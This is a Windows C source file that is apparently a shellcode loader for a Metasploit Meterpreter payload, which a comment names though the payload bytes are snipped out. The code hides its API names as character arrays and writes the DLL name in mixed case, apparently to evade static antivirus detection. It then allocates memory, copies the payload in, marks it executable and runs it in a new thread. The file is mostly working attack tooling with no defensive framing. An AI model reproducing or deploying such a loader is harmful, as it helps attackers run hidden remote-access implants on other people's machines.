#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <random>

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateThread_t)(LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags,LPDWORD lpThreadId);

unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};
unsigned char sCreateThread[] = {'C','r','e','a','t','e','T','h','r','e','a','d',0x0,};



int main(VOID) {
	//plain meterpreter payload
	//[...payload snipped for size]
	size_t payload_len = sizeof(payload);
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
		
		
	//function pointers
	VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) "KErnEl32.DLl"), (LPCSTR) sVirtualAlloc);
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) "kErnEl32.DLl"), (LPCSTR) sVirtualProtect);
	CreateThread_t CreateThread_p = (CreateThread_t) GetProcAddress(GetModuleHandle((LPCSTR) "kERnEl32.DLl"), (LPCSTR) sCreateThread);
		
		
	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc_p(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to program memory ; this gets inlined
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make payload executable
	rv = VirtualProtect_p(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nLaunch Payload?\n");
	getchar();

	// Run payload
	if ( rv != 0 ) {
		th = CreateThread_p(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, INFINITE);
				
	}
			
	return 0;
}